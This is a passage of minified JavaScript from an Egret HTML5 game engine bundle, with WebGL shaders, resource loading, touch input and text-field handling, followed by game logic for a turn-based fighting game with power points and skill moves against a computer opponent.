texture2D(uSampler, (vTextureCoord + vec2( 0.020 * blur.x,  0.020 * blur.y))) * 0.0215963866053;gl_FragColor += texture2D(uSampler, (vTextureCoord + vec2( 0.024 * blur.x,  0.024 * blur.y))) * 0.00895781211794;gl_FragColor += texture2D(uSampler, (vTextureCoord + vec2( 0.028 * blur.x,  0.028 * blur.y))) * 0.0044299121055113265;}";
            this.uniforms =
            {blur: {type: "2f", value: {x: 2, y: 2}}};
            this.init()
        }

        __extends(a, b);
        return a
    }(c.EgretShader);
    c.BlurShader = d;
    d.prototype.__class__ = "egret.BlurShader"
})(egret || (egret = {}));
(function (c) {
    var d = function () {
        function b(a) {
            this.alpha = this.translationMatrix = this.attributes = this.colorAttribute = this.aVertexPosition = this.tintColor = this.offsetVector = this.projectionVector = this.program = this.gl = null;
            this.fragmentSrc = "precision mediump float;\nvarying vec4 vColor;\nvoid main(void) {\n   gl_FragColor = vColor;\n}";
            this.vertexSrc = "attribute vec2 aVertexPosition;\nattribute vec4 aColor;\nuniform mat3 translationMatrix;\nuniform vec2 projectionVector;\nuniform vec2 offsetVector;\nuniform float alpha;\nuniform vec3 tint;\nvarying vec4 vColor;\nvoid main(void) {\n   vec3 v = translationMatrix * vec3(aVertexPosition , 1.0);\n   v -= offsetVector.xyx;\n   gl_Position = vec4( v.x / projectionVector.x -1.0, v.y / -projectionVector.y + 1.0 , 0.0, 1.0);\n   vColor = aColor * vec4(tint * alpha, alpha);\n}";
            this.gl = a;
            this.init()
        }

        b.prototype.init = function () {
            var a = this.gl, b = c.WebGLUtils.compileProgram(a, this.vertexSrc, this.fragmentSrc);
            a.useProgram(b);
            this.projectionVector = a.getUniformLocation(b, "projectionVector");
            this.offsetVector = a.getUniformLocation(b, "offsetVector");
            this.tintColor = a.getUniformLocation(b, "tint");
            this.aVertexPosition = a.getAttribLocation(b, "aVertexPosition");
            this.colorAttribute = a.getAttribLocation(b, "aColor");
            this.attributes = [this.aVertexPosition, this.colorAttribute];
            this.translationMatrix =
                a.getUniformLocation(b, "translationMatrix");
            this.alpha = a.getUniformLocation(b, "alpha");
            this.program = b
        };
        return b
    }();
    c.PrimitiveShader = d;
    d.prototype.__class__ = "egret.PrimitiveShader"
})(egret || (egret = {}));
(function (c) {
    var d = function () {
        function b(a) {
            this.gl = null;
            this.maxAttibs = 10;
            this.attribState = [];
            this.tempAttribState = [];
            this.blurShader = this.colorTransformShader = this.primitiveShader = this.defaultShader = this.currentShader = null;
            for (var b = 0; b < this.maxAttibs; b++)this.attribState[b] = !1;
            this.setContext(a)
        }

        b.prototype.setContext = function (a) {
            this.gl = a;
            this.primitiveShader = new c.PrimitiveShader(a);
            this.defaultShader = new c.EgretShader(a);
            this.colorTransformShader = new c.ColorTransformShader(a);
            this.blurShader =
                new c.BlurShader(a);
            this.activateShader(this.defaultShader)
        };
        b.prototype.activateShader = function (a) {
            this.currentShader != a && (this.gl.useProgram(a.program), this.setAttribs(a.attributes), this.currentShader = a)
        };
        b.prototype.setAttribs = function (a) {
            var b, c;
            c = this.tempAttribState.length;
            for (b = 0; b < c; b++)this.tempAttribState[b] = !1;
            c = a.length;
            for (b = 0; b < c; b++)this.tempAttribState[a[b]] = !0;
            a = this.gl;
            c = this.attribState.length;
            for (b = 0; b < c; b++)this.attribState[b] !== this.tempAttribState[b] && (this.attribState[b] = this.tempAttribState[b],
                this.tempAttribState[b] ? a.enableVertexAttribArray(b) : a.disableVertexAttribArray(b))
        };
        return b
    }();
    c.WebGLShaderManager = d;
    d.prototype.__class__ = "egret.WebGLShaderManager"
})(egret || (egret = {}));
__extends = this.__extends || function (c, d) {
    function b() {
        this.constructor = c
    }

    for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
    b.prototype = d.prototype;
    c.prototype = new b
};
(function (c) {
    var d = function (b) {
        function a() {
            b.call(this)
        }

        __extends(a, b);
        a.prototype.proceed = function (a) {
            function b() {
                if (4 == h.readyState)if (h.status != a._status && (a._status = h.status, c.HTTPStatusEvent.dispatchHTTPStatusEvent(a, h.status)), 400 <= h.status || 0 == h.status)c.IOErrorEvent.dispatchIOErrorEvent(a); else {
                    switch (a.dataFormat) {
                        case c.URLLoaderDataFormat.TEXT:
                            a.data = h.responseText;
                            break;
                        case c.URLLoaderDataFormat.VARIABLES:
                            a.data = new c.URLVariables(h.responseText);
                            break;
                        case c.URLLoaderDataFormat.BINARY:
                            a.data =
                                h.response;
                            break;
                        default:
                            a.data = h.responseText
                    }
                    c.__callAsync(c.Event.dispatchEvent, c.Event, a, c.Event.COMPLETE)
                }
            }

            if (a.dataFormat == c.URLLoaderDataFormat.TEXTURE)this.loadTexture(a); else if (a.dataFormat == c.URLLoaderDataFormat.SOUND)this.loadSound(a); else {
                var d = a._request, h = this.getXHR();
                h.onreadystatechange = b;
                var f = c.NetContext._getUrl(d);
                h.open(d.method, f, !0);
                this.setResponseType(h, a.dataFormat);
                d.method != c.URLRequestMethod.GET && d.data ? d.data instanceof c.URLVariables ? (h.setRequestHeader("Content-Type",
                    "application/x-www-form-urlencoded"), h.send(d.data.toString())) : (h.setRequestHeader("Content-Type", "multipart/form-data"), h.send(d.data)) : h.send()
            }
        };
        a.prototype.loadSound = function (a) {
            function b(f) {
                c.clearTimeout(h.__timeoutId);
                h.removeEventListener("canplaythrough", b, !1);
                h.removeEventListener("error", d, !1);
                f = new c.Sound;
                f._setAudio(h);
                a.data = f;
                c.__callAsync(c.Event.dispatchEvent, c.Event, a, c.Event.COMPLETE)
            }

            function d(f) {
                c.clearTimeout(h.__timeoutId);
                h.removeEventListener("canplaythrough", b, !1);
                h.removeEventListener("error",
                    d, !1);
                c.IOErrorEvent.dispatchIOErrorEvent(a)
            }

            var h = new Audio(a._request.url);
            h.__timeoutId = c.setTimeout(b, this, 100);
            h.addEventListener("canplaythrough", b, !1);
            h.addEventListener("error", d, !1);
            h.load()
        };
        a.prototype.getXHR = function () {
            return window.XMLHttpRequest ? new window.XMLHttpRequest : new ActiveXObject("MSXML2.XMLHTTP")
        };
        a.prototype.setResponseType = function (a, b) {
            switch (b) {
                case c.URLLoaderDataFormat.TEXT:
                case c.URLLoaderDataFormat.VARIABLES:
                    a.responseType = c.URLLoaderDataFormat.TEXT;
                    break;
                case c.URLLoaderDataFormat.BINARY:
                    a.responseType =
                        "arraybuffer";
                    break;
                default:
                    a.responseType = b
            }
        };
        a.prototype.loadTexture = function (a) {
            var b = a._request, d = new Image;
            d.onload = function (b) {
                d.onerror = null;
                d.onload = null;
                b = new c.Texture;
                b._setBitmapData(d);
                a.data = b;
                c.__callAsync(c.Event.dispatchEvent, c.Event, a, c.Event.COMPLETE)
            };
            d.onerror = function (b) {
                d.onerror = null;
                d.onload = null;
                c.IOErrorEvent.dispatchIOErrorEvent(a)
            };
            d.src = b.url
        };
        return a
    }(c.NetContext);
    c.HTML5NetContext = d;
    d.prototype.__class__ = "egret.HTML5NetContext"
})(egret || (egret = {}));
__extends = this.__extends || function (c, d) {
    function b() {
        this.constructor = c
    }

    for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
    b.prototype = d.prototype;
    c.prototype = new b
};
(function (c) {
    var d = function (b) {
        function a() {
            b.call(this);
            this._isTouchDown = !1;
            this.rootDiv = null;
            this.rootDiv = document.getElementById(c.StageDelegate.canvas_div_name)
        }

        __extends(a, b);
        a.prototype.prevent = function (a) {
            a.stopPropagation();
            !0 != a.isScroll && a.preventDefault()
        };
        a.prototype.run = function () {
            var a = this;
            window.navigator.msPointerEnabled ? (this.rootDiv.addEventListener("MSPointerDown", function (b) {
                a._onTouchBegin(b);
                a.prevent(b)
            }, !1), this.rootDiv.addEventListener("MSPointerMove", function (b) {
                a._onTouchMove(b);
                a.prevent(b)
            }, !1), this.rootDiv.addEventListener("MSPointerUp", function (b) {
                a._onTouchEnd(b);
                a.prevent(b)
            }, !1)) : c.MainContext.deviceType == c.MainContext.DEVICE_MOBILE ? this.addTouchListener() : c.MainContext.deviceType == c.MainContext.DEVICE_PC && (this.addTouchListener(), this.addMouseListener());
            window.addEventListener("mousedown", function (b) {
                a.inOutOfCanvas(b) ? a.dispatchLeaveStageEvent() : a._isTouchDown = !0
            });
            window.addEventListener("mouseup", function (b) {
                a._isTouchDown && (a.inOutOfCanvas(b) ? a.dispatchLeaveStageEvent() :
                    a._onTouchEnd(b));
                a._isTouchDown = !1
            })
        };
        a.prototype.addMouseListener = function () {
            var a = this;
            this.rootDiv.addEventListener("mousedown", function (b) {
                a._onTouchBegin(b)
            });
            this.rootDiv.addEventListener("mousemove", function (b) {
                a._onTouchMove(b)
            });
            this.rootDiv.addEventListener("mouseup", function (b) {
                a._onTouchEnd(b)
            })
        };
        a.prototype.addTouchListener = function () {
            var a = this;
            this.rootDiv.addEventListener("touchstart", function (b) {
                    for (var c = b.changedTouches.length, d = 0; d < c; d++)a._onTouchBegin(b.changedTouches[d]);
                    a.prevent(b)
                },
                !1);
            this.rootDiv.addEventListener("touchmove", function (b) {
                for (var c = b.changedTouches.length, d = 0; d < c; d++)a._onTouchMove(b.changedTouches[d]);
                a.prevent(b)
            }, !1);
            this.rootDiv.addEventListener("touchend", function (b) {
                for (var c = b.changedTouches.length, d = 0; d < c; d++)a._onTouchEnd(b.changedTouches[d]);
                a.prevent(b)
            }, !1);
            this.rootDiv.addEventListener("touchcancel", function (b) {
                for (var c = b.changedTouches.length, d = 0; d < c; d++)a._onTouchEnd(b.changedTouches[d]);
                a.prevent(b)
            }, !1)
        };
        a.prototype.inOutOfCanvas = function (a) {
            var b =
                this.getLocation(this.rootDiv, a);
            a = b.x;
            var b = b.y, d = c.MainContext.instance.stage;
            return 0 > a || 0 > b || a > d.stageWidth || b > d.stageHeight ? !0 : !1
        };
        a.prototype.dispatchLeaveStageEvent = function () {
            this.touchingIdentifiers.length = 0;
            c.MainContext.instance.stage.dispatchEventWith(c.Event.LEAVE_STAGE)
        };
        a.prototype._onTouchBegin = function (a) {
            var b = this.getLocation(this.rootDiv, a), c = -1;
            a.hasOwnProperty("identifier") && (c = a.identifier);
            this.onTouchBegan(b.x, b.y, c)
        };
        a.prototype._onTouchMove = function (a) {
            var b = this.getLocation(this.rootDiv,
                a), c = -1;
            a.hasOwnProperty("identifier") && (c = a.identifier);
            this.onTouchMove(b.x, b.y, c)
        };
        a.prototype._onTouchEnd = function (a) {
            var b = this.getLocation(this.rootDiv, a), c = -1;
            a.hasOwnProperty("identifier") && (c = a.identifier);
            this.onTouchEnd(b.x, b.y, c)
        };
        a.prototype.getLocation = function (a, b) {
            var d = document.documentElement, h = window, f, g;
            "function" === typeof a.getBoundingClientRect ? (g = a.getBoundingClientRect(), f = g.left, g = g.top) : g = f = 0;
            f += h.pageXOffset - d.clientLeft;
            g += h.pageYOffset - d.clientTop;
            null != b.pageX ? (d = b.pageX,
                h = b.pageY) : (f -= document.body.scrollLeft, g -= document.body.scrollTop, d = b.clientX, h = b.clientY);
            var k = c.Point.identity;
            k.x = (d - f) / c.StageDelegate.getInstance().getScaleX();
            k.y = (h - g) / c.StageDelegate.getInstance().getScaleY();
            return k
        };
        return a
    }(c.TouchContext);
    c.HTML5TouchContext = d;
    d.prototype.__class__ = "egret.HTML5TouchContext"
})(egret || (egret = {}));
__extends = this.__extends || function (c, d) {
    function b() {
        this.constructor = c
    }

    for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
    b.prototype = d.prototype;
    c.prototype = new b
};
(function (c) {
    var d = function (b) {
        function a() {
            b.call(this);
            this.inputElement = this.div = null;
            this._hasListeners = !1;
            this._inputType = "";
            this._isShow = !1;
            this.textValue = "";
            this._height = this._width = 0;
            this._styleInfoes = {};
            var a = c.StageDelegate.getInstance().getScaleX(), d = c.StageDelegate.getInstance().getScaleY(), n = c.Browser.getInstance().$new("div");
            n.position.x = 0;
            n.position.y = 0;
            n.scale.x = a;
            n.scale.y = d;
            n.transforms();
            n.style[egret_dom.getTrans("transformOrigin")] = "0% 0% 0px";
            this.div = n;
            d = c.MainContext.instance.stage;
            a = d.stageWidth;
            d = d.stageHeight;
            n = new c.Shape;
            n.width = a;
            n.height = d;
            n.touchEnabled = !0;
            this._shape = n;
            this.getStageDelegateDiv().appendChild(this.div)
        }

        __extends(a, b);
        a.prototype.getStageDelegateDiv = function () {
            var a = c.Browser.getInstance().$("#StageDelegateDiv");
            a || (a = c.Browser.getInstance().$new("div"), a.id = "StageDelegateDiv", document.getElementById(c.StageDelegate.canvas_div_name).appendChild(a), a.transforms());
            return a
        };
        a.prototype._setMultiline = function (a) {
            b.prototype._setMultiline.call(this, a);
            this.createInput()
        };
        a.prototype.callHandler = function (a) {
            a.stopPropagation()
        };
        a.prototype._add = function () {
            this.div && null == this.div.parentNode && this.getStageDelegateDiv().appendChild(this.div)
        };
        a.prototype._remove = function () {
            this._shape && this._shape.parent && this._shape.parent.removeChild(this._shape);
            this.div && this.div.parentNode && this.div.parentNode.removeChild(this.div)
        };
        a.prototype._addListeners = function () {
            this.inputElement && !this._hasListeners && (this._hasListeners = !0, this.inputElement.addEventListener("mousedown",
                this.callHandler), this.inputElement.addEventListener("touchstart", this.callHandler), this.inputElement.addEventListener("MSPointerDown", this.callHandler))
        };
        a.prototype._removeListeners = function () {
            this.inputElement && this._hasListeners && (this._hasListeners = !1, this.inputElement.removeEventListener("mousedown", this.callHandler), this.inputElement.removeEventListener("touchstart", this.callHandler), this.inputElement.removeEventListener("MSPointerDown", this.callHandler))
        };
        a.prototype.createInput = function () {
            var a =
                this._multiline ? "textarea" : "input";
            this._inputType != a && (this._inputType = a, null != this.inputElement && (this._removeListeners(), this.div.removeChild(this.inputElement)), this._multiline ? (a = document.createElement("textarea"), a.style.resize = "none") : a = document.createElement("input"), this._styleInfoes = {}, a.type = "text", this.inputElement = a, this.inputElement.value = "", this.div.appendChild(a), this._addListeners(), this.setElementStyle("width", "0px"), this.setElementStyle("border", "none"), this.setElementStyle("margin",
                "0"), this.setElementStyle("padding", "0"), this.setElementStyle("outline", "medium"), this.setElementStyle("verticalAlign", "top"), this.setElementStyle("wordBreak", "break-all"), this.setElementStyle("overflow", "hidden"))
        };
        a.prototype._open = function (a, b, c, d) {
        };
        a.prototype._setScale = function (a, d) {
            b.prototype._setScale.call(this, a, d);
            var n = c.StageDelegate.getInstance().getScaleX(), h = c.StageDelegate.getInstance().getScaleY();
            this.div.scale.x = n * a;
            this.div.scale.y = h * d;
            this.div.transforms()
        };
        a.prototype.changePosition =
            function (a, b) {
                var d = c.StageDelegate.getInstance().getScaleX(), h = c.StageDelegate.getInstance().getScaleY();
                this.div.position.x = a * d;
                this.div.position.y = b * h;
                this.div.transforms()
            };
        a.prototype.setStyles = function () {
            this.setElementStyle("fontStyle", this._italic ? "italic" : "normal");
            this.setElementStyle("fontWeight", this._bold ? "bold" : "normal");
            this.setElementStyle("textAlign", this._textAlign);
            this.setElementStyle("fontSize", this._size + "px");
            this.setElementStyle("color", "#000000");
            this.setElementStyle("width",
                this._width + "px");
            this.setElementStyle("height", this._height + "px");
            this.setElementStyle("display", "block")
        };
        a.prototype._show = function () {
            c.MainContext.instance.stage._changeSizeDispatchFlag = !1;
            0 < this._maxChars ? this.inputElement.setAttribute("maxlength", this._maxChars) : this.inputElement.removeAttribute("maxlength");
            this._isShow = !0;
            var a = this._getText();
            this.inputElement.value = a;
            var b = this;
            this.inputElement.oninput = function () {
                b.textValue = b.inputElement.value;
                b.dispatchEvent(new c.Event("updateText"))
            };
            this.setStyles();
            this.inputElement.focus();
            this.inputElement.selectionStart = a.length;
            this.inputElement.selectionEnd = a.length;
            this._shape && null == this._shape.parent && c.MainContext.instance.stage.addChild(this._shape)
        };
        a.prototype._hide = function () {
            c.MainContext.instance.stage._changeSizeDispatchFlag = !0;
            if (null != this.inputElement) {
                this._isShow = !1;
                this.inputElement.oninput = function () {
                };
                this.setElementStyle("border", "none");
                this.setElementStyle("display", "none");
                this.inputElement.value = "";
                this.setElementStyle("width",
                    "0px");
                window.scrollTo(0, 0);
                var a = this;
                c.setTimeout(function () {
                    a.inputElement.blur();
                    window.scrollTo(0, 0)
                }, this, 50);
                this._shape && this._shape.parent && this._shape.parent.removeChild(this._shape)
            }
        };
        a.prototype._getText = function () {
            this.textValue || (this.textValue = "");
            return this.textValue
        };
        a.prototype._setText = function (a) {
            this.textValue = a;
            this.resetText()
        };
        a.prototype.resetText = function () {
            this.inputElement && (this.inputElement.value = this.textValue)
        };
        a.prototype._setWidth = function (a) {
            this._width = a
        };
        a.prototype._setHeight =
            function (a) {
                this._height = a
            };
        a.prototype.setElementStyle = function (a, b) {
            this.inputElement && this._styleInfoes[a] != b && (this.inputElement.style[a] = b, this._styleInfoes[a] = b)
        };
        return a
    }(c.StageText);
    c.HTML5StageText = d;
    d.prototype.__class__ = "egret.HTML5StageText"
})(egret || (egret = {}));
egret.StageText.create = function () {
    return new egret.HTML5StageText
};
var __extends = this.__extends || function (c, d) {
        function b() {
            this.constructor = c
        }

        for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
        b.prototype = d.prototype;
        c.prototype = new b
    }, Game = function (c) {
    function d() {
        c.call(this);
        this.game_bg = [];
        this.add_power = [];
        this.skill_arr = [];
        this.game_bg = ["door", "rooftop", "lobby"];
        this.add_power = "+1  -1 -1 -3 -4 -5 -8".split(" ");
        this.bg_index = Common.c_random(0, 3);
        this.skill_arr = [];
        var b = new egret.Bitmap;
        b.texture = RES.getRes(this.game_bg[this.bg_index]);
        b.width = Main.stageW;
        b.height =
            Main.stageH;
        this.addChild(b);
        b = Common.c_name();
        b.y = 34 * Main.sFactor;
        b.x = Main.stageW / 2 - 0.6 * b.width / 2;
        b.scaleX = b.scaleY = 0.6;
        this.addChild(b);
        this.btn_pause = new egret.Bitmap;
        this.btn_pause.texture = RES.getRes("btn_home");
        this.btn_pause.anchorY = 0.5;
        this.btn_pause.x = Main.stageW / 2 - this.btn_pause.width / 2;
        this.btn_pause.y = 225 * Main.sFactor + this.btn_pause.height / 2;
        this.btn_pause.touchEnabled = !0;
        this.btn_pause.addEventListener(egret.TouchEvent.TOUCH_BEGIN, this.test, this);
        this.addChild(this.btn_pause);
        var b = this.power_sprite(0.17,
            206), a = this.power_sprite(0.83, 206);
        this.power_point_l = new egret.TextField;
        this.power_point_r = new egret.TextField;
        this.power_point_l.text = "0";
        this.power_point_r.text = "0";
        this.power_point_l.size = 36 * Main.sFactor;
        this.power_point_r.size = 36 * Main.sFactor;
        this.power_point_l.bold = !0;
        this.power_point_r.bold = !0;
        this.power_point_l.textColor = 16743936;
        this.power_point_r.textColor = 16743936;
        this.power_point_l.width = 130 * Main.sFactor;
        this.power_point_r.width = 130 * Main.sFactor;
        this.power_point_l.textAlign = "center";
        this.power_point_r.textAlign = "center";
        this.power_point_l.y = 75 * Main.sFactor;
        this.power_point_r.y = 75 * Main.sFactor;
        b.addChild(this.power_point_l);
        a.addChild(this.power_point_r);
        this.addChild(b);
        this.addChild(a);
        RES.getResAsync("description", this.set_skill, this)
    }

    __extends(d, c);
    d.prototype.test = function () {
        this.removeChildren();
        var b = new Start;
        this.addChild(b)
    };
    d.prototype.set_skill = function () {
        this.res = RES.getRes("description");
        var b = new egret.Sprite;
        b.width = Main.stageW;
        b.height = 330 * Main.sFactor;
        var a =
            new egret.Shape;
        a.graphics.beginFill(4604229, 1);
        a.graphics.drawRect(0, 0, Main.stageW, b.height);
        a.graphics.endFill();
        b.addChild(a);
        for (var a = new egret.Sprite, c = 0; 8 > c; c++) {
            var d = this.skills(c);
            this.skill_arr.push(d);
            a.addChild(d);
            if (1 != c) {
                var n = new egret.TextField;
                n.text = this.add_power[c];
                n._fontFamily = "\u5fae\u8f6f\u96c5\u9ed1";
                n.size = 30 * Main.sFactor;
                n.stroke = 3;
                n.bold = !0;
                n.textColor = c ? 15354185 : 2797387;
                n.x = d.x - 4 * Main.sFactor;
                n.y = d.y - 4 * Main.sFactor;
                a.addChild(n)
            }
        }
        a.x = Main.stageW / 2 - a.width / 2 - 30 * Main.sFactor;
        a.y = b.height / 2 - a.height / 2;
        b.addChild(a);
        b.x = 0;
        b.y = Main.stageH - b.height;
        this.addChild(b);
        this.set_event()
    };
    d.prototype.set_event = function () {
        for (var b = 0; 8 > b; b++)switch (b) {
            case 0:
                this.skill_arr[b].addEventListener(egret.TouchEvent.TOUCH_BEGIN, this.addPower, this);
                break;
            case 1:
                this.skill_arr[b].addEventListener(egret.TouchEvent.TOUCH_BEGIN, this.base_block, this);
                break;
            case 2:
                this.skill_arr[b].addEventListener(egret.TouchEvent.TOUCH_BEGIN, this.senior_block, this);
                break;
            case 3:
                this.skill_arr[b].addEventListener(egret.TouchEvent.TOUCH_BEGIN,
                    this.QiGong, this);
                break;
            case 4:
                this.skill_arr[b].addEventListener(egret.TouchEvent.TOUCH_BEGIN, this.black_dragon, this);
                break;
            case 5:
                this.skill_arr[b].addEventListener(egret.TouchEvent.TOUCH_BEGIN, this.sickle, this);
                break;
            case 6:
                this.skill_arr[b].addEventListener(egret.TouchEvent.TOUCH_BEGIN, this.thunder, this);
                break;
            case 7:
                this.skill_arr[b].addEventListener(egret.TouchEvent.TOUCH_BEGIN, this.vigour, this)
        }
    };
    d.prototype.addPower = function (b) {
    };
    d.prototype.base_block = function (b) {
    };
    d.prototype.senior_block =
        function (b) {
        };
    d.prototype.QiGong = function (b) {
    };
    d.prototype.black_dragon = function (b) {
    };
    d.prototype.sickle = function (b) {
    };
    d.prototype.thunder = function (b) {
    };
    d.prototype.vigour = function (b) {
    };
    d.prototype.skills = function (b) {
        var a = new egret.Bitmap;
        a.texture = RES.getRes(this.res[b][1].icon);
        a.touchEnabled = !0;
        4 > b ? a.x = b ? 32 * (b + 1) * Main.sFactor + b * a.width : 30 * Main.sFactor : (a.x = 32 * (b - 3) * Main.sFactor + (b - 4) * a.width, a.y = 149 * Main.sFactor);
        return a
    };
    d.prototype.power_sprite = function (b, a) {
        var c = new egret.Sprite;
        c.width =
            130 * Main.sFactor;
        c.height = 120 * Main.sFactor;
        var d = new egret.Shape;
        d.graphics.lineStyle(3, 16777215);
        d.graphics.beginFill(16777215, 1);
        d.graphics.drawRoundRect(0, 0, c.width, c.height, 5);
        d.graphics.endFill();
        c.addChild(d);
        d = new egret.Shape;
        d.graphics.beginFill(16743936, 1);
        d.graphics.drawRect(0, 0, c.width, 63 * Main.sFactor);
        d.graphics.endFill();
        c.addChild(d);
        d = new egret.TextField;
        d.text = "Power";
        d.textColor = 16777215;
        d.bold = !0;
        d.size = 30 * Main.sFactor;
        d.width = 130 * Main.sFactor;
        d._fontFamily = "\u5fae\u8f6f\u96c5\u9ed1";
        d.textAlign = "center";
        d.y = 15 * Main.sFactor;
        c.addChild(d);
        c.x = Main.stageW * b - c.width / 2;
        c.y = a * Main.sFactor;
        return c
    };
    return d
}(egret.DisplayObjectContainer);
Game.prototype.__class__ = "Game";
var __extends = this.__extends || function (c, d) {
        function b() {
            this.constructor = c
        }

        for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
        b.prototype = d.prototype;
        c.prototype = new b
    }, Login_2 = function (c) {
    function d() {
        c.call(this);
        this.first_bout = this.global_bout = !0;
        this.second_bout = !1;
        this.sign = 0;
        this.second_Tap = this.enough_vigour = this.enough_thunder = this.enough_sickle = this.enough_blackDragon = this.enough_qiQ = this.enough_senior = this.vigour_Bool = this.thunder_Bool = this.sickle_Bool = this.black_dragon_Bool = this.qi_gong_Bool =
            this.senior_block_Bool = this.base_block_Bool = this.storage_Bool = !1;
        this.symbol = 2;
        this.addEventListener(egret.Event.ADDED_TO_STAGE, this.onLoadStage, this)
    }

    __extends(d, c);
    d.prototype.onLoadStage = function () {
        this.removeEventListener(egret.Event.ADDED_TO_STAGE, this.onLoadStage, this);
        var b = RES.getRes("player_json"), a = RES.getRes("player_png");
        this.mcFactory = new egret.MovieClipDataFactory(b, a);
        this.player = new egret.MovieClip(this.mcFactory.generateMovieClipData("stand"));
        this.player.x = 20 * Main.sFactor + this.player.width /
        2 * Main.sFactor;
        this.player.y = 538 * Main.sFactor + this.player.height / 2 * Main.sFactor;
        this.player.scaleX = this.player.scaleY = Main.sFactor;
        b = RES.getRes("boss_2_json");
        a = RES.getRes("boss_2_png");
        this.AiFactory = new egret.MovieClipDataFactory(b, a);
        this.Ai_player = new egret.MovieClip(this.AiFactory.generateMovieClipData("stand"));
        this.Ai_player.x = 0.88 * Main.stageW;
        this.Ai_player.y = 538 * Main.sFactor + this.Ai_player.height / 2 * Main.sFactor;
        this.Ai_player.scaleX = this.Ai_player.scaleY = Main.sFactor;
        this.addChild(this.Ai_player);
        this.addChild(this.player);
        this.prompt = new Prompt;
        this.addChild(this.prompt);
        this.stage.addEventListener(egret.Event.ENTER_FRAME, this.onEnterFrame, this)
    };
    d.prototype.getProbability = function (b, a) {
        switch (a) {
            case 2:
                this.second(b);
                break;
            case 3:
                this.second(b);
                break;
            case 4:
                this.four(b);
                break;
            case 5:
                this.five(b);
                break;
            case 6:
                this.sixth(b);
                break;
            case 7:
                this.seventh(b);
                break;
            default:
                this.another(b)
        }
    };
    d.prototype.outcome_1 = function () {
        this.base_block_Bool || this.qi_gong_Bool || (this.storage_Bool ? this.loser() :
            this.senior_block_Bool ? this.enough_senior && this.loser() : this.sickle_Bool ? this.enough_sickle && this.winner() : this.vigour_Bool ? this.enough_vigour && this.winner() : this.thunder_Bool ? this.enough_thunder && this.winner() : this.black_dragon_Bool && this.enough_blackDragon && this.winner())
    };
    d.prototype.outcome_2 = function () {
        this.base_block_Bool || this.qi_gong_Bool || this.storage_Bool || this.senior_block_Bool || (this.sickle_Bool ? this.enough_sickle && this.winner() : this.vigour_Bool ? this.enough_vigour && this.winner() : this.thunder_Bool ?
        this.enough_thunder && this.winner() : this.black_dragon_Bool && this.enough_blackDragon && this.winner())
    };
    d.prototype.outcome_3 = function () {
        this.base_block_Bool || (this.qi_gong_Bool ? this.enough_qiQ && this.winner() : this.storage_Bool || this.senior_block_Bool || (this.sickle_Bool ? this.enough_sickle && this.winner() : this.vigour_Bool ? this.enough_vigour && this.winner() : this.thunder_Bool ? this.enough_thunder && this.winner() : this.black_dragon_Bool && this.enough_blackDragon && this.winner()))
    };
    d.prototype.outcome_4 = function () {
        this.base_block_Bool ?
            this.loser() : this.qi_gong_Bool ? this.loser() : this.storage_Bool ? this.loser() : this.senior_block_Bool ? this.enough_senior || this.loser() : this.sickle_Bool ? this.enough_sickle && this.winner() : this.vigour_Bool ? this.enough_vigour && this.winner() : this.thunder_Bool && this.enough_thunder && this.winner()
    };
    d.prototype.outcome_5 = function () {
        this.base_block_Bool || (this.qi_gong_Bool ? this.enough_qiQ && this.winner() : this.storage_Bool || this.senior_block_Bool || this.sickle_Bool || this.vigour_Bool && this.enough_vigour && this.winner())
    };
    d.prototype.allot = function () {
        Common.c_random(0, 2) ? this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("base_block") : (this.power_point_r.text = this.player_power() + 1 + "", this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("storage"));
        this.Ai_player.play()
    };
    d.prototype.second = function (b) {
        4 > b ? (this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("base_block"), this.Ai_player.play(), this.outcome_2()) : 8 > b ? 0 > this.Ai_power() - 1 ? (this.power_point_r.text = "0", this.allot()) :
            (this.power_point_r.text = this.Ai_power() - 1 + "", this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("Qigong"), this.Ai_player.play(), this.outcome_1()) : (this.power_point_r.text = this.Ai_power() + 1 + "", this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("storage"), this.Ai_player.play(), this.outcome_3())
    };
    d.prototype.four = function (b) {
        6 > b ? (this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("base_block"), this.Ai_player.play(), this.outcome_2()) : (this.power_point_r.text =
            this.Ai_power() + 1 + "", this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("storage"), this.Ai_player.play(), this.outcome_3())
    };
    d.prototype.five = function (b) {
        2 >= b ? 0 > this.Ai_power() - 3 ? (this.power_point_r.text = "0", this.allot()) : (this.power_point_r.text = this.Ai_power() - 3 + "", this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("black_dragon"), this.Ai_player.play(), this.outcome_4()) : 5 >= b ? (this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("base_block"), this.Ai_player.play(),
            this.outcome_2()) : 7 >= b ? 0 > this.Ai_power() - 1 ? (this.power_point_r.text = "0", this.allot()) : (this.power_point_r.text = this.Ai_power() - 1 + "", this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("Qigong"), this.Ai_player.play(), this.outcome_1()) : (this.power_point_r.text = this.Ai_power() + 1 + "", this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("storage"), this.Ai_player.play(), this.outcome_2())
    };
    d.prototype.sixth = function (b) {
        2 >= b ? 0 > this.Ai_power() - 3 ? (this.power_point_r.text = "0", this.allot()) :
            (this.power_point_r.text = this.Ai_power() - 3 + "", this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("black_dragon"), this.Ai_player.play(), this.outcome_4()) : 5 >= b ? (this.power_point_r.text = this.Ai_power() + 1 + "", this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("storage"), this.Ai_player.play(), this.outcome_2()) : 7 >= b ? 0 > this.Ai_power() - 1 ? (this.power_point_r.text = "0", this.allot()) : (this.power_point_r.text = this.Ai_power() - 1 + "", this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("Qigong"),
            this.Ai_player.play(), this.outcome_1()) : (this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("base_block"), this.Ai_player.play(), this.outcome_3())
    };
    d.prototype.seventh = function (b) {
